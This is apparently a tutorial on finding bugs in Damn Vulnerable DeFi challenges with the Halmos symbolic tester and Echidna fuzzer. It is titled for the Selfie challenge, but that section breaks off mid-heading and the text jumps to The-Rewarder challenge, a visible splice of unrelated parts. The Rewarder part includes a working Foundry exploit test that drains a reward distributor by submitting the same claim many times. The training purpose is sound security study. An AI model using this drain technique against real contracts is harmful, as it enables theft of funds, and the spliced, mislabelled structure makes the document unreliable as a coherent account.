# Halmos vs Selfie
## Halmos version
halmos 0.2.2.dev6+g27f620a was used in this article
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)

since the main ideas here are largely repeated and we will not dwell on them again.
## Preparation
### Common prerequisites
1. Copy **Selfie.t.sol** file to **SelfieHalmos.t.sol**.
2. Rename `test_selfie()` to `check_selfie()`, so Halmos will execute this test symbolically.
3. Avoid using **makeAddr()** cheatcode:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    ```
4. Create **GlobalStorage** contract and save address-name pairs of contracts:
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(token), "DamnValuableVotes");
        glob.add_addr_name_pair(address(governance), "SimpleGovernance");
        glob.add_addr_name_pair(address(pool), "SelfiePool");
        ...
    ```
5. Print all contract addresses:
    ```solidity
    function check_selfie() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    console.log("GlobalStorage\t", address(glob));
    console.log("token\t\t", address(token));
    console.log("governance\t", address(governance));
    console.log("pool\t\t", address(pool));
    console.log("attacker\t\t", address(attacker));
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
    ...
    [console.log] GlobalStorage 0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] token         0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] governance    0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] pool          0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] attacker      0x00000000000000000000000000000000000000000000000000000000aaaa0006
    ```
### _isSolved() implementation
The original checks look like:
```solidity
function _isSolved() private view {
    // Player has taken all tokens from the pool
    assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
    assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
}
```
So, we are searching for some scenario to empty the pool by some amount:
```solidity
function _isSolved() private view {
    assert (token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
}
```
## Improvement of coverage
Let's run one symbolic transaction and carefully see if we can increase code coverage with trivial methods:
```solidity
function attack() public {
    execute_tx();
    //execute_tx();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3 -vvvvv
```
Among all reverted paths, we can highlight several that we can bypass in an obvious way.
### onFlashLoan
Consider these several paths:
```javascript
Path #67:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL SimpleGovernance::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```javascript
Path #68:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL 0xaaaa0003::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```javascript
Path #72:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL GlobalStorage::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```solidity
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
    external
    nonReentrant
    returns (bool)
{
    ...
    if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }
    ...
}    
```
Here's what's going on: in `selfiePool::flashLoan()` we pass `_receiver` as a parameter. As we execute the transaction symbolically, Halmos starts brute-forcing all addresses known to it as a `_receiver`, trying to execute the `onFlashLoan()` function from each contract. We saw something similar in [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/naive-receiver/README.md#optimizations). However, this time, we do not have a ready-made **IERC3156FlashBorrower** contract in the setup, so at the moment all `flashLoan` transactions are doomed to **revert**. But it's not scary, it's obvious that we can make such a callback inside our **SymbolicAttacker**, as we did in [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/side-entrance/README.md#callbacks):
```solidity
function onFlashLoan(address initiator, address token,
                    uint256 amount, uint256 fee,
                    bytes calldata data
) external returns (bytes32) 
{
    address target = svm.createAddress("target_onFlashLoan");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call(data);
}
```
Plus, take into account that this `flashLoan` needs to be returned "honestly" this time. And should return a valid string:
```solidity
function flashLoan(...)
{
    ...
    if (!token.transferFrom(address(_receiver), address(this), _amount)) {
        revert RepayFailed();
    }
    ...
}
```
So, **SymbolicAttacker**:
```solidity
function onFlashLoan(...)
{
    ...
    DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1);
    return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
}
```
And, indeed, we help the solver by assuming that the only `_receiver` can only be **SymbolicAttacker**:
```solidity
function flashLoan(...)
{
    vm.assume(address(_receiver) == address(0xaaaa0006));
    ...
}
```
This optimization is VERY effective. Without it, the number of paths was 660 with a execution time of 20 seconds. With it - only 115 and 8 seconds on my PC.
### _canBeExecuted


## Improvement of coverage
Plannedly launch one symbolic transaction to check whether all paths are covered:
```solidity
function attack() private {
    execute_tx();
    //execute_tx();
}
function check_theRewarder() public checkSolvedByPlayer {
    ...
    attack();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder
...
[ERROR] check_theRewarder() (paths: 180, time: 30.22s, bounds: [])
WARNING:halmos:Encountered symbolic memory offset: 704 + Concat(Extract(250, 0, p_inputClaims[0].tokenIndex_uint256_5cfd392_07), 0)
...
WARNING:halmos:check_theRewarder(): paths have not been fully explored due to the loop unrolling bound: 2
...
```
### Increase the symbolic loops
We have as many as 3 contracts stored in GlobalStorage, but Halmos runs 2 loop iterations by default. Let's add the parameter "--loop 3" to the Halmos command.
### Symbolic token index
The old symbolic offset problem, but in a new form. This time we are trying to retrieve an IERC20 token by index, which is a symlobic value. and Halmos doesn't like it:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    if (token != inputTokens[inputClaim.tokenIndex]) {
...
```
We will get around this by using a symbolic token instead of inputTokens[inputClaim.tokenIndex] everywhere:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    address symbolicInputToken = svm.createAddress("SymbolicInputToken");
    if (msg.sender != address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // If Alice 
    {
        symbolicInputToken = address(inputTokens[inputClaim.tokenIndex]);
    }
    //if (token != inputTokens[inputClaim.tokenIndex]) {
    if (token != IERC20(symbolicInputToken)) {
        ...
        //token = inputTokens[inputClaim.tokenIndex];
        token = IERC20(symbolicInputToken);
        ...
    }
    ...
    //inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    IERC20(token).transfer(msg.sender, inputClaim.amount);
}
```
Here it is also worth explicitly talking about how Halmos handles arrays of symbolic size, as in this case (if player calls this function symbolically - the size of inputClaims and inputTokens arrays will be symbolic). This is regulated by the --default-array-lengths parameter, which by default is "0,1,2". This means that Halmos will handle 3 cases separately: when array size is 0, when it is 1, and when it is 2.

Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 3
...
Counterexample:
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0003
halmos_SymbolicInputToken_address_b649884_30 = 0x00000000000000000000000000000000aaaa0003
halmos_selector_bytes4_d3ac38a_28 = claimRewards
halmos_target_address_dbdff73_03 = 0x00000000000000000000000000000000aaaa0006
p_inputClaims[0].amount_uint256_0ac9401_08 = 0x0000000000000000000000000000000000000000000000000028f1b62e14044a
p_inputClaims[0].batchNumber_uint256_31113fc_07 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[0].proof_length_7e0bd7f_10 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims[1].amount_uint256_916073c_14 = 0x0000000000000000000000000000000000000000000000000028f1b62e14044a
p_inputClaims[1].batchNumber_uint256_4f51f7f_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[1].proof_length_108c345_16 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims_length_8309fbf_06 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
...
Counterexample:
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
halmos_selector_bytes4_d3ac38a_28 = claimRewards
halmos_target_address_dbdff73_03 = 0x00000000000000000000000000000000aaaa0006
p_inputClaims[0].amount_uint256_0ac9401_08 = 0x0000000000000000000000000000000000000000000000000004291958e62fb4
p_inputClaims[0].batchNumber_uint256_31113fc_07 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[0].proof_length_7e0bd7f_10 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims[1].amount_uint256_916073c_14 = 0x0000000000000000000000000000000000000000000000000004291958e62fb4
p_inputClaims[1].batchNumber_uint256_4f51f7f_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[1].proof_length_108c345_16 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims_length_8309fbf_06 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
```
We were lucky: one symbolic transaction was enough to find the bug. Let's deal with a counterexample.
## Counterexamples analysis
The 2 counterexamples provided are essentially one bug that worked separately on DVT and WETH tokens. In simple words, we can collect our reward several times if we pass the same tokenIndex several times in the inputClaims array:
```javascript
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
```
Remember that we replaced the inputTokens[inputClaim] logic with a SymbolicInputToken, therefore, the logic of the bug is not so obvious from the counterexample. But nevertheless - a bug was found.
## Using a counterexample
In the Halmos test, we ignored cryptographic checks. However, we will use them here. We also remember that we need to transfer all funds to recovery. So, let's build an attack so as to empty the distributor for the maximum possible amount:
```solidity
function test_theRewarder() public checkSolvedByPlayer {
    bytes32[] memory dvtLeaves = _loadRewards(
        "/test/the-rewarder/dvt-distribution.json"
    );
    bytes32[] memory wethLeaves = _loadRewards(
        "/test/the-rewarder/weth-distribution.json"
    );
    uint256 dvtPlayerReward = 11524763827831882;
    uint256 wethPlayerReward = 1171088749244340;
    uint256 dvtAttackCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtPlayerReward;
    uint256 wethAttackCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethPlayerReward;

    Claim[] memory claims = new Claim[](dvtAttackCount + wethAttackCount);
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));
    for (uint256 i = 0; i < dvtAttackCount; i++) {
        claims[i] = Claim({
        batchNumber: 0, // claim corresponds to first DVT batch
        amount: dvtPlayerReward,
        tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
        proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
        });
    }
    for (uint256 i = 0; i < wethAttackCount; i++) {
        claims[dvtAttackCount + i] = Claim({
        batchNumber: 0, // claim corresponds to first DVT batch
        amount: wethPlayerReward,
        tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
        proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
        });
    }

    distributor.claimRewards({
        inputClaims: claims,
        inputTokens: tokensToClaim
    });

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```
Run:
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol
...
[PASS] test_theRewarder() (gas: 1005136185)
...
```
Another challenge was solved using a bug found by Halmos!
## Fuzzing time
At the time of writing, I have not found a fuzzing solution for the updated version of "The-Rewarder". Let's try to implement it ourselves. We'll use Echidna as fuzzing engine.
### Common preparations
Echidna config file:
```javascript
deployer: '0xcafe0001' 
sender: ['0x44E97aF4418b7a17AABD8090bEA0A471a366305C']
allContracts: true
workers: 8
balanceContract: 100000000000000000000000000000000000000000000000000000000000000000000000
```
Since Echidna has the same problems with loading data from json - let's do the same trick using hardcoded data:
```solidity
constructor() public payable {
    ...
    bytes32[] memory dvtLeaves = _loadRewardsDVT();
    bytes32[] memory wethLeaves = _loadRewardsWETH();
    ...
}
...
function _loadRewardsDVT() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...e962", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}

function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...b3d4", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
```
Also, for simplicity, we completely ignore the logic with Alice, since the fact that she took her tokens does not affect the presence of the bug in any way. We are only interested in whether Echidna can find the bug. So, invariant:
```solidity
function echidna_testSolved() public returns (bool) {
    if (dvt.balanceOf(address(distributor)) >= 
        TOTAL_DVT_DISTRIBUTION_AMOUNT - 11524763827831882) 
    {
        if (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT - 1171088749244340) 
        {
            return true;
        }
    }
    return false;
}
```
For Echidna, we will also simplify the task of proof checking in TheRewarderDistributor::claimRewards(). Let's remove this check but assume that we have passed correct arguments:
```solidity
if (token != inputTokens[inputClaim.tokenIndex]) {
    if (inputTokens[inputClaim.tokenIndex] == 
        IERC20(address(0x62d69f6867A0A084C6d313943dC22023Bc263691))) // weth
    {
        inputClaim.amount = 1171088749244340;
    }
    else if (inputTokens[inputClaim.tokenIndex] == 
        IERC20(address(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84))) // dvt)
    {
        inputClaim.amount = 11524763827831882;
    }
    ...
    //bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
    //bytes32 root = distributions[token].roots[inputClaim.batchNumber];

    //if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
```
Run:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: passing
...
```
Nothing. 
### Analysis of the limits of Echidna
After this fail, I decided to check whether it would even be able to craft valid parameters that would take away at least its "fair" reward. 

Let's simplify the invariant for a while:
```solidity
function echidna_testSolved() public returns (bool) {
    if (dvt.balanceOf(address(distributor)) >= 
        TOTAL_DVT_DISTRIBUTION_AMOUNT/* - 11524763827831882*/) 
    {
        if (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT/* - 1171088749244340*/) 
        {
            return true;
        }
    }
    return false;
}
```
Run again:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: failed!💥
  Call sequence:
    TheRewarderDistributor.claimRewards([(3, 4, 2, ["s\208n\ENQ\233\198\246v\157\134Gsw\200)N\SI\137\210\184\138\175\254\207\217\DEL\197sy\235T\236", "z\DLE]\155\142)b\199\146\SI\159o\193\\\228\156\EOTk\237\216j\SOH%\131\193\&5\170\DELqzw\223"])],[0x1fffffffe, 0x1fffffffe, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0xffffffff, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0x2fffffffd, 0x1fffffffe, 0xffffffff, 0x0, 0xb4c79dab8f259c7aee6e5b2aa729821864227e84])
...
```
Cool! At least the "fair" transaction it found. Let's check if Echidna is able to generate the same simple transaction, but with a larger inputClaims array (at least of size 2):
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    require(inputClaims.length >= 2);
    ...
```
Try:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: passing
...
```
Yeah, the problem is that Echidna has a hard time generating an inputClaims array of size at least 2. I found the following [article](https://secure-contracts.com/program-analysis/echidna/fuzzing_tips.html#handling-dynamic-arrays) that recommends using the push-pop pattern in such cases:
```solidity
contract TheRewarderDistributor {
    ...
    Claim[] public storageInputClaims;
    IERC20[] public storageInputTokens;
    ...
    function pushClaim(Claim memory claim) public {
        storageInputClaims.push(claim);
    }
    
    function pushToken(IERC20 token) public {
        storageInputTokens.push(token);
    }

    ...
    function claimRewards(/*Claim[] memory inputClaims, IERC20[] memory inputTokens*/) external {
        ...
         for (uint256 i = 0; i < storageInputClaims.length; i++) {
            inputClaim = storageInputClaims[i];
            ...
            if (token != storageInputTokens[inputClaim.tokenIndex]) {
                ...
                token = storageInputTokens[inputClaim.tokenIndex];
                ...
            }
            ...
            // for the last claim
            if (i == storageInputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
            ...
        }
}
```
Start and pray:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: failed!💥
  Call sequence:
    TheRewarderDistributor.pushClaim((0, 0, 0, []))
    TheRewarderDistributor.pushToken(0xb4c79dab8f259c7aee6e5b2aa729821864227e84)
    TheRewarderDistributor.pushClaim((0, 0, 0, []))
    TheRewarderDistributor.claimRewards()
...
```
Success! the push-pop pattern really turned out to be effective.
## Conclusions
1. Even if we face some engine limitations (Halmos or Echidna) - don't be afraid to use "dirty" tricks, even if they look ugly. All for the sake of the result!
2. When constructing tests with cryptographic checks, there is a very effective technique: we do not check cryptography at all, but we explicitly assume that the data was entered correctly.
3. If we compare how Halmos and Echidna coped with this challenge, we can say that both tools did quite well. But, in my opinion, Halmos was a little more convenient - every step of contract preparation was obvious and planned, the tool itself gave a hint on how to change the target contract through warnings. At the same time, in the case of Echidna, we had to find the limits of code coverage manually and use not the most obvious technique to force fuzzing to cover the case with 2 inputClaims.
